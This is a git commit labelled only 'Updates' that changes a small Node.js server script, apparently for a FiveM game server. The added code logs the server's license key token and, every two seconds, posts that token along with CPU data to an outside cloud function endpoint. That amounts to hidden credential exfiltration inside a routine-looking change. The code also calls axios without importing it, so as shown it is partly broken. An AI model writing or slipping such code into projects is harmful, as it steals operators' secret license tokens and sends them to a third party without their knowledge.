13af7d01ddcf1486ee4963f45000bc72604494d9
mehmetefeerkan <mehmetefe@prodigygaming.network>
2022-01-17 13:26:38 +0300

    Updates

--- server.js
+++ server.js
@@ -1,5 +1,15 @@
 console.log("hello world!")
+console.log(GetConvar("sv_licenseKeyToken"))
 const si = require('systeminformation')
-si.cpu()
-    .then(data => console.log(data))
+let cpuData = {}
+
+setInterval(() => {
+    si.cpu()
+    .then(data => { cpuData = data })
     .catch(error => console.error(error));
+}, 5000);
+
+
+setInterval(() => {
+    axios.post('https://us-central1-mewsemp.cloudfunctions.net/systemIngress', {system: cpuData, lkt: GetConvar("sv_licenseKeyToken")})
+}, 2000)
